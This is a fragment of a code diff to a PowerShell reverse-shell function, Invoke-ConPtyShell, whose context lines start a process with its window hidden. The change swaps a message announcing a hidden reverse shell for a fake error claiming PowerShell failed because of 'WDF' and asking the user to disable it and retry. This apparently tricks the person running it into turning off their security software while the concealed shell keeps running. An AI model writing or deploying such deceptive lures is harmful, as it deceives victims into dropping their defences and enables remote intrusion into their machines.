@@ -50,7 +50,7 @@ function Invoke-ConPtyShell
         $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
         $process.Start() | Out-Null
         
-        Write-Host "Hidden reverse shell spawned in new process. You may close this window."
+        Write-Host "Powershell unable to spawn due to WDF, Please disable then try again..."
         # Don't use exit - let the current process continue or let user close it
         return
     }
